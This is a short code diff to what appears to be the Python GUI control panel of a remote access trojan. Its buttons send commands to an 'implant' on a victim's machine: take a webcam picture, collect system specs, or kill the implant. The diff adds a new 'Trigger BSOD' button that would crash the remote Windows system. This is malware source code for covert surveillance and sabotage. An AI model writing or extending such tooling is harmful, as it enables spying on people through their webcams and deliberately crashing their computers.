@@ -208,6 +208,7 @@ def setup_tabs(self):
     ctk.CTkButton(system_tab, text="Take Webcam Picture", command=lambda: self.dispatch_command("irlpicture", friendly_name="Take Webcam Picture")).pack(pady=5, padx=10, fill="x")
     ctk.CTkButton(system_tab, text="Get System Specs", command=lambda: self.dispatch_command("systemspecs", friendly_name="Get System Specs")).pack(pady=5, padx=10, fill="x")
     ctk.CTkButton(system_tab, text="Kill Implant", command=lambda: self.dispatch_command("kill", friendly_name="Kill Implant"), fg_color="red", hover_color="darkred").pack(pady=5, padx=10, fill="x")
+    ctk.CTkButton(system_tab, text="Trigger BSOD", command=lambda: self.dispatch_command("bsod", friendly_name="Trigger BSOD"), fg_color="red", hover_color="darkred").pack(pady=5, padx=10, fill="x")  # New BSOD button
     interact_tab = self.tab_view.add("Interaction")
     interact_tab.grid_columnconfigure(0, weight=1)
     url_entry = ctk.CTkEntry(interact_tab, placeholder_text="https://example.com")
